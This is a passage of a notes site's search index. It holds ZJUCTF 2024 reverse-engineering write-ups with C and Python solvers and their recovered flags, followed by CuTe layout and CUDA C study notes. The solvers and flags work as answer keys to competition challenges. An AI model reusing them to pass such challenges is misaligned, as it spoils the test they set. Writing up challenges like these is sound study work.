else {\n        af = 0;\n    }\n    if (*al &gt; 0x9F || cf == 1) {\n        *al -= 0x60;\n        cf = 1;\n    } else {\n        cf = 0;\n    }\n}\n\nint main() {\n    int v6; // [esp-8h] [ebp-90h]\n    int v7; // [esp-4h] [ebp-8Ch]\n    int v8; // [esp+0h] [ebp-88h]\n    int i; // [esp+0h] [ebp-88h]\n    int s1[6]; // [esp+4h] [ebp-84h] BYREF\n    uint16_t v11; // [esp+1Ch] [ebp-6Ch]\n    int v12[6]; // [esp+1Eh] [ebp-6Ah]\n    uint16_t v13; // [esp+36h] [ebp-52h]\n    int v14[6]; // [esp+38h] [ebp-50h]\n    uint16_t v15; // [esp+50h] [ebp-38h]\n    int s2[6]; // [esp+52h] [ebp-36h] BYREF\n    uint16_t v17; // [esp+6Ah] [ebp-1Eh]\n    unsigned int v18; // [esp+6Ch] [ebp-1Ch]\n\n    memset(s1, 0, sizeof(s1));\n    v11 = 0;\n    v12[0] = 807607868;\n    v12[1] = 2035092818;\n    v12[2] = -615563966;\n    v12[3] = 3126271;\n    v12[4] = 1328692767;\n    v12[5] = -1532805550;\n    v13 = -28895;\n    v14[0] = -778337675;\n    v14[1] = 916896758;\n    v14[2] = 2142365868;\n    v14[3] = 431515568;\n    v14[4] = 121126838;\n    v14[5] = 1384365358;\n    v15 = -11;\n    s2[0] = -456284019;\n    s2[1] = -825299208;\n    s2[2] = 1858015695;\n    s2[3] = 1263581624;\n    s2[4] = 678129086;\n    s2[5] = -1275860159;\n    v17 = -30731;\n    unsigned char af0 = 1, cf0 = 1;\n    for (int i = 0; i &lt;= 25; ++i) {\n        // save af and cf\n        af0 = af;\n        cf0 = cf;\n        for (unsigned char c = 0; c &lt; 200; ++c) {\n            // restore af and cf\n            af = af0;\n            cf = cf0;\n            unsigned char al = c;\n            unsigned char bl = *((unsigned char *)v12 + i);\n            unsigned char cl = *((unsigned char *)v14 + i);\n            unsigned char res;\n            af = (al &amp; 0x0F) &lt; (bl &amp; 0x0F);\n            cf = al &lt; bl;\n            al = al - bl;\n            das(&amp;al);\n            af = (al &amp; 0x0F) + (cl &amp; 0x0F) &gt; 0xF;\n            cf = (int)al + (int)cl &gt; 0xFF;\n            al = al + cl;\n            res = al;\n            if (res == *((unsigned char *)s2 + i)) {\n                *((unsigned char *)s1 + i) = c;\n                break;\n            }\n        }\n    }\n    for (int i = 0; i &lt; 26; ++i) {\n        printf(\"%c\", *((unsigned char *)s1 + i));\n    }\n    return 0;\n}\n</code></pre> <p>\u5f97\u5230 <code>ZJUCTF{welc0me-2-reverse@\ufffd</code>\uff0c\u731c\u4e00\u4e0b\u6700\u540e\u4e24\u4e2a\u5b57\u7b26\uff0c\u5f97\u5230 flag <code>ZJUCTF{welc0me-2-reverse!}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#rev-beginner-3","title":"rev beginner 3","text":"<p>\u53d1\u73b0\u52a0\u5bc6\u8fc7\u7a0b\u90fd\u53ef\u9006\uff0c\u90a3\u76f4\u63a5\u5012\u7740\u89e3\u5bc6\u5c31\u884c\u4e86\u3002\u867d\u7136\u7528\u4e86\u968f\u673a\u6570\uff0c\u4f46\u7ed9\u4e86\u79cd\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u8fd8\u539f\u3002\u53e6\u5916\u4e0d\u540c\u67b6\u6784\u4e0a\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u8fd8\u4e0d\u4e00\u6837\uff0c\u653e amd64 \u673a\u5b50\u4e0a\u624d\u80fd\u8dd1\u51fa\u6765\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid func1_rev(unsigned char *a1, int a2) {\n    a2 += 16909060 * 7;\n    for (int i = 6; i &gt;= 0; --i) {\n        a2 -= 16909060;\n        *(uint32_t *)(a1 + 4LL * i) ^= a2;\n    }\n}\n\nuint32_t __ROL4__(uint32_t value, int count)\n{\n  const uint32_t nbits = sizeof(uint32_t) * 8;\n\n  if ( count &gt; 0 )\n  {\n    count %= nbits;\n    uint32_t high = value &gt;&gt; (nbits - count);\n    if ( (uint32_t)(-1) &lt; 0 ) // signed value\n      high &amp;= ~(((uint32_t)(-1) &lt;&lt; count));\n    value &lt;&lt;= count;\n    value |= high;\n  }\n  else\n  {\n    count = -count % nbits;\n    uint32_t low = value &lt;&lt; (nbits - count);\n    value &gt;&gt;= count;\n    value |= low;\n  }\n  return value;\n}\n\nuint32_t __ROR4__(uint32_t value, int count)\n{\n  return __ROL4__(value, -count);\n}\n\nvoid func2_rev(unsigned char *a1, int a2)\n{\n    for (int i = 6; i &gt;= 0; --i )\n    {\n        *(uint32_t *)(a1 + 4LL * i) = __ROL4__(*(uint32_t *)(a1 + 4LL * i), 12);\n        *(uint32_t *)(a1 + 4LL * i) ^= 570619159 - i;\n        *(uint32_t *)(a1 + 4LL * i) = __ROR4__(*(uint32_t *)(a1 + 4LL * i) + a2, 7);\n        *(uint32_t *)(a1 + 4LL * i) ^= a2 + 270817907;\n    }\n}\n\nvoid func3_rev(unsigned char *a1)\n{\n  for (int i = 26; i &gt;= 0; --i )\n  {\n    *(uint8_t *)(a1 + i) ^= *(uint8_t *)(a1 + i + 1);\n    *(uint8_t *)(a1 + i + 1) ^= *(uint8_t *)(a1 + i);\n    *(uint8_t *)(a1 + i) ^= *(uint8_t *)(a1 + i + 1);\n  }\n}\n\nunsigned char sbox[256] = {\n    0x70, 0x82, 0x2C, 0xEC, 0xB3, 0x27, 0xC0, 0xE5, 0xE4, 0x85, 0x57, 0x35, 0xEA, 0x0C, 0xAE, 0x41,\n    0x23, 0xEF, 0x6B, 0x93, 0x45, 0x19, 0xA5, 0x21, 0xED, 0x0E, 0x4F, 0x4E, 0x1D, 0x65, 0x92, 0xBD,\n    0x86, 0xB8, 0xAF, 0x8F, 0x7C, 0xEB, 0x1F, 0xCE, 0x3E, 0x30, 0xDC, 0x5F, 0x5E, 0xC5, 0x0B, 0x1A,\n    0xA6, 0xE1, 0x39, 0xCA, 0xD5, 0x47, 0x5D, 0x3D, 0xD9, 0x01, 0x5A, 0xD6, 0x51, 0x56, 0x6C, 0x4D,\n    0x8B, 0x0D, 0x9A, 0x66, 0xFB, 0xCC, 0xB0, 0x2D, 0x74, 0x12, 0x2B, 0x20, 0xF0, 0xB1, 0x84, 0x99,\n    0xDF, 0x4C, 0xCB, 0xC2, 0x34, 0x7E, 0x76, 0x05, 0x6D, 0xB7, 0xA9, 0x31, 0xD1, 0x17, 0x04, 0xD7,\n    0x14, 0x58, 0x3A, 0x61, 0xDE, 0x1B, 0x11, 0x1C, 0x32, 0x0F, 0x9C, 0x16, 0x53, 0x18, 0xF2, 0x22,\n    0xFE, 0x44, 0xCF, 0xB2, 0xC3, 0xB5, 0x7A, 0x91, 0x24, 0x08, 0xE8, 0xA8, 0x60, 0xFC, 0x69, 0x50,\n    0xAA, 0xD0, 0xA0, 0x7D, 0xA1, 0x89, 0x62, 0x97, 0x54, 0x5B, 0x1E, 0x95, 0xE0, 0xFF, 0x64, 0xD2,\n    0x10, 0xC4, 0x00, 0x48, 0xA3, 0xF7, 0x75, 0xDB, 0x8A, 0x03, 0xE6, 0xDA, 0x09, 0x3F, 0xDD, 0x94,\n    0x87, 0x5C, 0x83, 0x02, 0xCD, 0x4A, 0x90, 0x33, 0x73, 0x67, 0xF6, 0xF3, 0x9D, 0x7F, 0xBF, 0xE2,\n    0x52, 0x9B, 0xD8, 0x26, 0xC8, 0x37, 0xC6, 0x3B, 0x81, 0x96, 0x6F, 0x4B, 0x13, 0xBE, 0x63, 0x2E,\n    0xE9, 0x79, 0xA7, 0x8C, 0x9F, 0x6E, 0xBC, 0x8E, 0x29, 0xF5, 0xF9, 0xB6, 0x2F, 0xFD, 0xB4, 0x59,\n    0x78, 0x98, 0x06, 0x6A, 0xE7, 0x46, 0x71, 0xBA, 0xD4, 0x25, 0xAB, 0x42, 0x88, 0xA2, 0x8D, 0xFA,\n    0x72, 0x07, 0xB9, 0x55, 0xF8, 0xEE, 0xAC, 0x0A, 0x36, 0x49, 0x2A, 0x68, 0x3C, 0x38, 0xF1, 0xA4,\n    0x40, 0x28, 0xD3, 0x7B, 0xBB, 0xC9, 0x43, 0xC1, 0x15, 0xE3, 0xAD, 0xF4, 0x77, 0xC7, 0x80, 0x9E\n};\n\nunsigned char sbox_rev[256];\n\nunsigned char ans[28] = {\n    0xE6, 0x80, 0xE5, 0x4F, 0x3C, 0x05, 0x12, 0xF9, 0xE8, 0xF7,\n    0x71, 0x3B, 0x92, 0x91, 0x67, 0x5F, 0x5B, 0x91, 0x83, 0x13, 0x73,\n    0x65, 0x1E, 0xE4, 0x8D, 0x20, 0x9A, 0x82\n};\n\nint rand_vals[21];\n\nint main() {\n    srand(0x1337u);\n    for (int i = 0; i &lt; 21; i++) {\n        rand_vals[i] = rand();\n    }\n\n    for (int i = 0; i &lt; 256; ++i) {\n        sbox_rev[sbox[i]] = (unsigned char)i;\n    }\n\n    unsigned char flag[28];\n    memcpy(flag, ans, 28);\n\n    func1_rev(flag, rand_vals[20]);\n    for (int i = 19; i &gt;= 0; i--) {\n        func3_rev(flag);\n        for (int j = 0; j &lt;= 27; ++j) {\n            flag[j] = sbox_rev[flag[j]];\n        }\n        func2_rev(flag, (unsigned int)i);\n        func1_rev(flag, rand_vals[i]);\n    }\n    for (int i = 0; i &lt;= 27; ++i) {\n        printf(\"%c\", flag[i]);\n    }\n    return 0;\n}\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{s0_EaSy_2_gE7_@n$W3R}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#easy-hap","title":"easy hap","text":"<p>\u7ed9\u4e86\u4e2a\u9e3f\u8499\u7684 app\uff0c\u76f4\u63a5\u89e3\u538b\uff0c\u7528 jadx \u6253\u5f00\u91cc\u9762\u7684 <code>module.abc</code> \u6587\u4ef6\uff0c\u91cc\u9762 <code>CipherUtil</code> \u8fd9\u4e2a\u7c7b\u5728\u505a\u52a0\u89e3\u5bc6\u3002</p> <p>\u662f\u4e2a\u94fe\u5f0f\u52a0\u5bc6\uff0c\u91cc\u9762\u7684\u53c2\u6570\u4f20\u9012\u5565\u7684\u770b\u4e0d\u61c2\uff0c\u731c\u4e86\u731c\u7136\u540e\u505a\u51fa\u6765\u4e86\u3002</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport numpy as np\nfrom Crypto.Cipher import AES\nimport base64\n\ndef string_to_uint8_array(s):\n    return np.array([ord(c) for c in s], dtype=np.uint8)\n\ndef encodeX(arg0, arg1):\n    res = []\n    for i in range(16):\n        res.append(arg0[i] ^ arg1[i])\n    for i in range(16):\n        res.append(arg1[i])\n    return res\n\ndef encodeY(arg):\n    return base64.b64encode(bytes(arg)).decode()\n\ndef decodeY(arg):\n    return base64.b64decode(arg)\n\ndef decodeX(res):\n    arg0 = res[:16]\n    arg1 = res[16:]\n    for i in range(16):\n        arg0[i] ^= arg1[i]\n    return arg0, arg1\n\ncommonCipherKey = string_to_uint8_array(\"ZJUCTF2024-OHAPP\").tobytes()\n\ncode = \"Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c=\"\n\ntmp4 = code\n\ntmp3 = decodeY(tmp4)\ntmp3 = [c for c in tmp3]\n# print(tmp3)\n\ntmp1, tmp2 = decodeX(tmp3)\ntmp1 = bytes(tmp1)\ntmp2 = bytes(tmp2)\n# print(tmp2)\n# print(tmp1)\n\ncipherY = AES.new(commonCipherKey, AES.MODE_CBC, iv=tmp1)\nslice2 = cipherY.decrypt(tmp2)\n# print(slice2)\n\ncipherX = AES.new(commonCipherKey, AES.MODE_ECB)\nslice1 = cipherX.decrypt(tmp1)\n# print(slice1)\n\nflag = slice1 + slice2\nprint(\"ZJUCTF{\" + flag.decode() + \"}\")\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#rukma","title":"Rukma","text":"<p>\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0 flag \u7684\u5f62\u5f0f\u4e3a <code>A-A-A-A-A-A-A-A-A-A-A-A</code> \u5176\u4e2d <code>A</code> \u4e3a <code>x</code> \u6216 <code>m</code> \u6216 <code>o</code>\u3002\u90a3\u4e48\u76f4\u63a5\u679a\u4e3e\u7206\u7834\u5c31\u884c\u4e86\u3002</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# pwntools is too slow!!!\nimport subprocess\nimport tqdm\nimport itertools\nimport random\nimport time\n\ncharset = \"xmo\"\nlength = 23 - 11\ncomb = itertools.product(charset, repeat=length)\ncomb = list(comb)\nrandom.shuffle(comb) # maybe we can find the flag faster\n\nexe_path = \"./chall\"\n\nfor c in tqdm.tqdm(comb):\n    flag = ''.join(c)\n    for i in range(1, 23, 2):\n        flag = flag[:i] + '-' + flag[i:]\n    # print(flag)\n\n    p = subprocess.Popen(\n        exe_path,\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    p.stdin.write(flag + '\\n')\n    p.stdin.flush()\n    stdout = p.stdout.read()\n    # print(stdout)\n    if stdout != \"input: try again\\n\":\n        print(stdout)\n        break\n    p.stdin.close()\n    p.stdout.close()\n    p.wait()\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{m-x-m-m-o-o-x-o-m-x-o-x}</code>\u3002</p>"},{"location":"hpc/","title":"HPC","text":"<p>Abstract</p> <p>\u5f52\u6863 HPC \u7684\u4e00\u4e9b\u5b66\u4e60\u7b14\u8bb0</p>"},{"location":"hpc/cute/layout/","title":"Layout","text":""},{"location":"hpc/cute/layout/#layout_1","title":"Layout \u63cf\u8ff0","text":""},{"location":"hpc/cute/layout/#_1","title":"\u5386\u53f2\u9636\u6bb5","text":"<ul> <li>BLAS: row/column major + leading dimension</li> <li>Tensor: shape + stride</li> <li>Hierarchy Tensor</li> </ul>"},{"location":"hpc/cute/layout/#_2","title":"\u4e00\u7ef4\u5411\u91cf","text":"<p>shape(8), stride(1) \u8868\u793a\u5305\u62ec 8 \u4e2a\u903b\u8f91\u4f4d\u7f6e\uff0c\u903b\u8f91\u4f4d\u7f6e\u548c\u7269\u7406\u4f4d\u7f6e\u6620\u5c04\u65f6\u6bcf\u4e2a\u5143\u7d20\u4e4b\u95f4\u7684\u5dee\u4e3a 1</p> <p>\u5176\u8ba1\u7b97\u903b\u8f91\u4e3a \\(index_{physical} = index_{logical} * stride\\)</p> <pre><code>shape(8), stride(1)\nlogical:   0 1 2 3 4 5 6 7\nphysical:  0 1 2 3 4 5 6 7\n</code></pre> <pre><code>shape(8), stride(2)\nlogical:   0   1   2   3   4   5     6     7\nphysical:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n</code></pre> <pre><code>shape(8), stride(0)\nlogical:   0 1 2 3 4 5 6 7\nphysical:  0\n</code></pre> <pre><code>shape(8), stride(-1)\nlogical:                        0 1 2 3 4 5 6 7\nphysical:  -7 -6 -5 -4 -3 -2 -1 0\n</code></pre>"},{"location":"hpc/cute/layout/#_3","title":"\u4e8c\u7ef4\u77e9\u9635","text":"<p>shape(2, 3), stride(3, 1) \u8868\u793a 2 \u884c 3 \u5217\u7684\u77e9\u9635\u3002\u5bf9\u4e8e\u6bcf\u884c\u4e4b\u95f4\uff0c\u903b\u8f91\u4f4d\u7f6e\u548c\u7269\u7406\u4f4d\u7f6e\u6620\u5c04\u65f6\u6bcf\u4e2a\u5143\u7d20\u4e4b\u95f4\u7684\u5dee\u4e3a 3\uff1b\u5bf9\u4e8e\u6bcf\u5217\u4e4b\u95f4\uff0c\u903b\u8f91\u4f4d\u7f6e\u548c\u7269\u7406\u4f4d\u7f6e\u6620\u5c04\u65f6\u6bcf\u4e2a\u5143\u7d20\u4e4b\u95f4\u7684\u5dee\u4e3a 1</p> <p>\u4e8c\u7ef4\u7a7a\u95f4\u7684\u5217\u4f18\u5148\u63cf\u8ff0\uff1ashape(3, 4), stride(1, 3) \uff1b\u884c\u4f18\u5148\u63cf\u8ff0\uff1ashape(3, 4), stride(4, 1)</p> <pre><code>shape(2, 3), stride(3, 1)\n\nlogical:   (0,0) (0,1) (0,2)\n           (1,0) (1,1) (1,2)\n\noffset:    0 1 2\n           3 4 5\n\npyhsical:  0 1 2 3 4 5\n</code></pre> <p>\u5176\u6620\u5c04\u5173\u7cfb\u4e3a \\(index_{physical} = \\sum_{i:dim} index_{logical,i} * stride_i\\)</p>"},{"location":"hpc/cute/layout/#layout_2","title":"\u6709\u5c42\u6b21\u7684 Layout","text":"<p>\u5176\u4e2d</p> <pre><code>A:\n(4, 8) &lt;- shape\n(1, 4) &lt;- stride\n</code></pre> <p>\u8868\u793a 4 \u884c 8 \u5217\uff0c\u6bcf\u884c\u7269\u7406\u4f4d\u7f6e\u4e4b\u5dee\u4e3a 1\uff0c\u6bcf\u5217\u7269\u7406\u4f4d\u7f6e\u4e4b\u5dee\u4e3a 4</p> <pre><code>C:\n[4, (2, 4)] &lt;- shape\n[2, (1, 8)] &lt;- stride\n</code></pre> <p>\u8868\u793a 4 \u884c 8 \u5217\u7684\u77e9\u9635\uff0c\u4e14\u5bf9\u5217\u8fdb\u884c\u5206\u5757\u5927\u5c0f\u4e3a 2 \u7684\u5206\u5757\uff0c\u6bcf\u884c\u7269\u7406\u4f4d\u7f6e\u4e4b\u5dee\u4e3a 1\uff0c\u6bcf\u5217\u4e2d\u5206\u5757\u5185\u76f8\u90bb\u5143\u7d20\u7269\u7406\u4f4d\u7f6e\u4e4b\u5dee\u4e3a 1\uff0c\u76f8\u90bb\u5206\u5757\u4e4b\u95f4\u7269\u7406\u4f4d\u7f6e\u4e4b\u5dee\u4e3a 8\u3002</p> <p>cute \u63d0\u4f9b\u4e86 <code>make_shape</code> \u548c <code>make_stride</code> \u4e24\u4e2a\u51fd\u6570\u6765\u6784\u9020\u5c42\u6b21\u7684 shape \u548c stride.</p> <p>\u5e38\u91cf shape\uff1a</p> <pre><code>auto shape = make_shape(Int&lt;2&gt;{}, Int&lt;3&gt;{});\nauto shape1 = make_shape(shape, Int&lt;3&gt;{});\n</code></pre> <p>\u53d8\u91cf shape\uff1a</p> <pre><code>auto shape = make_shape(m, n);\n</code></pre>"},{"location":"hpc/cute/layout/#layout_3","title":"Layout \u7684\u4ee3\u6570\u548c\u51e0\u4f55\u89e3\u91ca","text":""},{"location":"hpc/cute/layout/#_4","title":"\u57fa\u672c\u5c5e\u6027","text":"<p>\u5982\u4e0a Layout \uff0c\u57fa\u672c\u5c5e\u6027\u5982\u4e0b\u8868\uff1a</p> shape stride size rank depth coshape cosize ((2, 4), (3, 5)) ((3, 6), (1, 24)) 120 2 2 120 120 <ul> <li>shape \u548c stride \u8868\u793a layout \u7684\u903b\u8f91\u5f62\u72b6\u548c\u6bcf\u4e2a\u7ef4\u5ea6\u5728\u5730\u5740\u4e2d\u7684\u6b65\u957f</li> <li>size \u8868\u793a\u903b\u8f91\u7a7a\u95f4\u7684\u5927\u5c0f</li> <li>rank \u8868\u793a layout \u7684\u79e9\uff0c\u7b49\u4e8e shape \u7b2c\u4e00\u5c42\u7684\u5143\u7d20\u4e2a\u6570</li> <li>depth \u8868\u793a layout \u7684\u5d4c\u5957\u6df1\u5ea6\uff0c\u5b9a\u4e49\u975e\u5d4c\u5957 layout \u7684 depth \u4e3a 1</li> <li>coshape \u8868\u793a codomain \u7684\u7a7a\u95f4\u5927\u5c0f</li> <li>cosize \u8868\u793a\u5360\u7528\u7a7a\u95f4\u5927\u5c0f\uff0c\u5982\u679c stride \u4e0d\u7d27\u51d1\uff0c\u5219 cosize \u53ef\u80fd\u5927\u4e8e size</li> </ul>"},{"location":"hpc/cute/layout/#coordinate","title":"Coordinate \u5750\u6807","text":"<ul> <li>\u4e00\u5c42 layout\uff1a\u6307\u5b9a\u884c\u5217\u5750\u6807<code>auto coord = make_coord(1, 2);</code> </li> <li> <p>\u591a\u5c42\uff1a\u5c06 make_coord \u8fdb\u884c\u5d4c\u5957\uff1a</p> <pre><code>auto coord = make_coord(make_coord(1, 3), make_coord(2, 4));\n</code></pre> <p>\u6ce8\u610f make_coord \u53c2\u6570\u4ece\u5185\u5230\u5916\u3002\u4e0a\u8ff0\u6307\u5b9a\u7684\u5750\u6807\u5982\u4e0b\uff1a</p> <p></p> </li> </ul>"},{"location":"hpc/cute/layout/#slice","title":"Slice \u5207\u7247","text":"<p>cute \u63d0\u4f9b\u4e86 Underscore \u7c7b\u578b\u5bf9\u67d0\u4e2a\u7ef4\u5ea6\u8fdb\u884c\u5168\u9009\uff0c\u5bf9\u5e94\u53d8\u91cf\u4e3a <code>_</code>\uff0c\u7c7b\u4f3c python \u4e2d <code>:</code> \u3002</p>"},{"location":"hpc/cute/layout/#complement","title":"Complement \u8865\u96c6","text":"<p>\u5f53 codomain \u4e0d\u8fde\u7eed\u65f6\uff0c\u53ef\u4ee5\u6784\u9020\u539f layout \u7684\u8865\u96c6 layout2 \u8865\u4e0a codomain \u7a7a\u7f3a\u7684\u7a7a\u95f4\uff08\u6ce8\u610f\uff1alayout \u7684 codomain \u548c layout2 \u7684 codomain \u53ef\u80fd\u6709\u91cd\u5408\u90e8\u5206\uff09\uff0c\u4e3a\u4e86\u8868\u793a\u7684\u7b80\u6d01\u6027\uff0c\u8865\u96c6\u4f1a\u88ab\u538b\u7f29\u4e3a\u6700\u5c0f\u8868\u793a\uff0c\u5468\u671f\u6027\u91cd\u590d\u7684\u90e8\u5206\u4f1a\u88ab\u7ea6\u6389\u3002</p> <p></p>"},{"location":"hpc/cute/layout/#product","title":"Product \u4e58\u6cd5","text":""},{"location":"hpc/cute/tensor/","title":"Tensor","text":""},{"location":"hpc/cute/tensor/#tensor_1","title":"Tensor \u751f\u6210","text":"<pre><code>// \u6808\u4e0a\u5bf9\u8c61\uff1a\u9700\u540c\u65f6\u6307\u5b9a\u7c7b\u578b\u548cLayout\uff0clayout\u5fc5\u987b\u662f\u9759\u6001shape\nTensor make_tensor&lt;T&gt;(Layout layout);\n\n// \u5806\u4e0a\u5bf9\u8c61\uff1a\u9700\u6307\u5b9apointer\u548cLayout\uff0clayout\u53ef\u52a8\u53ef\u9759\nTensor make_tensor(Pointer pointer, Layout layout);\n\n// \u6808\u4e0a\u5bf9\u8c61\uff0ctensor\u7684layout\u5fc5\u987b\u662f\u9759\u6001\u7684\nTensor make_tensor_like(Tensor tensor); \n\n// \u6808\u4e0a\u5bf9\u8c61\uff0ctensor\u7684layout\u5fc5\u987b\u662f\u9759\u6001\u7684\nTensor make_fragment_like(Tensor tensor);\n</code></pre>"},{"location":"hpc/hpc101/","title":"HPC 101","text":"<p>Abstract</p> <p>\u5927\u4e00\u6691\u5047\u8d85\u7b97\u77ed\u5b66\u671f labs</p> <p>\u5b9e\u9a8c\u624b\u518c</p>"},{"location":"hpc/hpc101/cuda/","title":"NVIDIA CUDA C","text":"<p>Abstract</p> <p>GPU \u7f16\u7a0b\u539f\u7406\u4e0e NVIDIA CUDA C \u7f16\u7a0b\u5b9e\u9a8c</p>"},{"location":"hpc/hpc101/cuda/#gpu","title":"GPU \u7f16\u7a0b\u539f\u7406","text":""},{"location":"hpc/hpc101/cuda/#cpu-vs-gpu","title":"CPU vs. GPU","text":"CPU \uff1a <ul> <li>\u5c11\u91cf\u4e14\u590d\u6742\u7684\u6838\u5fc3</li> <li>\u4f4e\u5185\u5b58\u5ef6\u8fdf\u7684\u7f13\u5b58\uff08cache\uff09\u8f83\u5927</li> <li>\u5185\u5b58\u5927\u4f46\u6162</li> </ul> GPU \uff1a <ul> <li>\u5927\u91cf\u7b80\u5355\u6838\u5fc3</li> <li>\u4f4e\u5185\u5b58\u5ef6\u8fdf\u7684\u7f13\u5b58\uff08cache\uff09\u8f83\u5c0f</li> <li>\u5185\u5b58\u5c0f\u4f46\u5feb</li> </ul>"},{"location":"hpc/hpc101/cuda/#cuda-vs","title":"CUDA \u7f16\u7a0b\u6a21\u578b vs. \u786c\u4ef6\u6267\u884c\u6a21\u578b","text":""},{"location":"hpc/hpc101/cuda/#_1","title":"\u4f53\u7cfb\u7ed3\u6784\u7c7b\u522b\u548c\u7f16\u7a0b\u6a21\u578b","text":"<ul> <li>SISD\uff08Single instruction, single data\uff09\u5355\u6307\u4ee4\u6d41\u5355\u6570\u636e\u6d41\uff1a\u4f20\u7edf\u7684\u4e32\u884c\u8ba1\u7b97\u673a\u3002</li> <li>SIMD\uff08Single instruction, multiple data\uff09\u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff1aAVX\u3001SSE \u7b49\u6307\u4ee4\u96c6\u3002</li> <li>SPMD\uff08Single program, multiple data\uff09\u5355\u7a0b\u5e8f\u591a\u6570\u636e\u6d41\uff1a\u5bf9\u95ee\u9898\u8fdb\u884c\u5206\u89e3\uff0c\u518d\u8fdb\u884c\u5e76\u884c\u6c42\u89e3\u3002</li> </ul> <p>\u524d\u4e24\u4e2a\u662f\u4f53\u7cfb\u7ed3\u6784\u7c7b\u522b\uff0c\u6700\u540e\u4e00\u4e2a\u662f\u7f16\u7a0b\u6a21\u578b\u3002</p>"},{"location":"hpc/hpc101/cuda/#cuda-cc","title":"CUDA C/C++ \u7f16\u7a0b","text":"<p>\u7531 NVIDIA \u6df1\u5ea6\u5b66\u4e60\u57f9\u8bad\u4e2d\u5fc3 (DLI) \u63d0\u4f9b\u7684\u8bfe\u7a0b\uff0c\u5728\u7531 NVIDIA \u63d0\u4f9b\u7684\u4e91\u73af\u5883\u4e0a\u8fdb\u884c\u5b9e\u9a8c\u3002</p>"},{"location":"hpc/hpc101/cuda/#cuda-cc_1","title":"\u4f7f\u7528 CUDA C/C++ \u52a0\u901f\u7a0b\u5e8f","text":""},{"location":"hpc/hpc101/cuda/#_2","title":"\u52a0\u901f\u7cfb\u7edf","text":"<p>\u52a0\u901f\u7cfb\u7edf\u53c8\u79f0\u5f02\u6784\u7cfb\u7edf\uff0c\u7531 CPU \u548c GPU \u7ec4\u6210\u3002\u52a0\u901f\u7cfb\u7edf\u8fd0\u884c CPU \u7a0b\u5e8f\uff0c\u7531\u8fd9\u4e9b\u7a0b\u5e8f\u8c03\u5ea6\u8fd0\u884c\u4e8e GPU \u4e0a\u7684\u51fd\u6570\uff0c\u901a\u8fc7 GPU \u5b9e\u73b0\u51fd\u6570\u7684\u5e76\u884c\u8ba1\u7b97\u3002</p> <p>\u67e5\u8be2 GPU \u4fe1\u606f\u547d\u4ee4\uff1a</p> <pre><code>$ nvidia-smi\n</code></pre>"},{"location":"hpc/hpc101/cuda/#gpu_1","title":"GPU \u52a0\u901f\u539f\u7406","text":"<p>\u4e00\u4e2a\u7b80\u5355\u7684 GPU \u52a0\u901f\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\uff1a</p> <p></p> <ul> <li><code>(1)</code> \u6bb5\uff1a\u6570\u636e\u7531 <code>cudaMallocManaged()</code> \u51fd\u6570\u5206\u914d\uff0c\u5e76\u80fd\u7531 CPU \u8bbf\u95ee\u5904\u7406\u3002</li> <li><code>(2)</code> \u6bb5\uff1a\u6570\u636e\u53ef\u88ab\u8fc1\u79fb\u81f3\u53ef\u6267\u884c\u5e76\u884c\u5de5\u4f5c\u7684 GPU \uff0c\u5e76\u7531 GPU \u6838\u51fd\u6570\u8bbf\u95ee\uff0c\u540c\u65f6 CPU \u53ef\u7ee7\u7eed\u6267\u884c\u5de5\u4f5c\uff08\u5f02\u6b65\u6267\u884c\uff09\u3002</li> <li>\u901a\u8fc7 <code>cudaDeviceSynchronize()</code> \uff0c\u5c06 CPU \u4e0e GPU \u7684\u5de5\u4f5c\u540c\u6b65\u3002</li> <li><code>(3)</code> \u6bb5\uff1a\u7ecf CPU \u8bbf\u95ee\u7684\u6570\u636e\u8fc1\u79fb\u56de CPU\u3002</li> </ul>"},{"location":"hpc/hpc101/cuda/#gpu_2","title":"GPU \u52a0\u901f\u5e94\u7528\u7a0b\u5e8f\u7f16\u5199","text":"<p>CUDA \u52a0\u901f\u7a0b\u5e8f\u6587\u4ef6\u6269\u5c55\u540d\u4e3a <code>.cu</code> \uff0c\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\uff1a</p> <pre><code>void CPUFunction()\n{\n  printf(\"This function is defined to run on the CPU.\\n\");\n}\n\n__global__ void GPUFunction()\n{\n  printf(\"This function is defined to run on the GPU.\\n\");\n}\n\nint main()\n{\n  CPUFunction();\n\n  GPUFunction&lt;&lt;&lt;1, 1&gt;&gt;&gt;();\n  cudaDeviceSynchronize();\n}\n</code></pre> <p>\u4e00\u4e9b\u8bed\u6cd5\uff1a</p> <p><code>__global__ void GPUFunction()</code></p> <ul> <li><code>__global__</code> \u5173\u952e\u5b57\u8868\u660e\u4ee5\u4e0b\u51fd\u6570\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u5e76\u53ef \u5168\u5c40 \u8c03\u7528\u3002</li> <li>\u901a\u5e38\uff0c\u5c06\u5728 CPU \u4e0a\u6267\u884c\u7684\u4ee3\u7801\u79f0\u4e3a \u4e3b\u673a (Host) \u4ee3\u7801\uff0c\u800c\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u4ee3\u7801\u79f0\u4e3a \u8bbe\u5907(Device) \u4ee3\u7801\u3002</li> <li>\u4f7f\u7528 <code>__global__</code> 